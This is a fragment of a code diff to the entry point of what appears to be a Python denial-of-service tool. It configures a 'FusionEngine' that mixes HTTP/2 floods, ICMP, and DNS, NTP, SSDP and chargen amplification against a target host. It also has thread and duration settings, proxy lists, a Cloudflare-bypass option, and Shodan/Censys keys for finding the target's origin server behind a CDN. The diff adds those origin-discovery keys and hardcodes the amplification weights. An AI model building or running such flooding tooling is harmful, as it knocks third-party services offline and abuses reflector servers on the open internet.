     host = parsed.hostname or args.target
     http_url = args.target if parsed.scheme else f"http://{args.target}"
-    port = args.port if args.port else (443 if parsed.scheme == "https" else 80)
-
-    ssdp_hosts = []
-    if args.ssdp_hosts and os.path.isfile(args.ssdp_hosts):
-        with open(args.ssdp_hosts) as f:
-            ssdp_hosts = [line.strip() for line in f if line.strip()]
 
     config = {
         "host": host,
-        "port": port,
+        "port": args.port if args.port else (443 if parsed.scheme == "https" else 80),
         "https": args.ssl or parsed.scheme == "https",
         "http_url": http_url,
         "threads": args.threads,
         "duration": args.duration,
         "find_origin": args.find_origin,
+        "shodan_api": args.shodan_api,
+        "censys_id": args.censys_id,
+        "censys_secret": args.censys_secret,
         "proxy_file": args.proxy_file,
         "no_tui": args.no_tui,
         "cloudscraper": args.cloudscraper,
-        "hpack_size": args.hpack_size,
-        "dns_resolver": args.dns_resolver,
-        "ntp_server": args.ntp_server,
-        "ssdp_hosts": ssdp_hosts,
         "chargen_server": args.chargen_server,
         "weights": {
             "http2": 0.3,
@@ -933,8 +877,8 @@ def main():
             "icmp": 0.05,
             "dns_amp": 0.1,
             "ntp_amp": 0.05,
-            "ssdp_amp": 0.05 if ssdp_hosts else 0,
-            "chargen_amp": 0.05 if args.chargen_server else 0,
+            "ssdp_amp": 0.05,
+            "chargen_amp": 0.05,
         }
     }
 
@@ -942,12 +886,10 @@ def main():
         with open(args.profile, 'r') as f:
             profile = json.load(f)
             config.update(profile)
-            # Ensure weights are merged
-            if "weights" in profile:
-                config["weights"].update(profile["weights"])
 
     engine = FusionEngine(config)
     engine.launch()
+
 
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
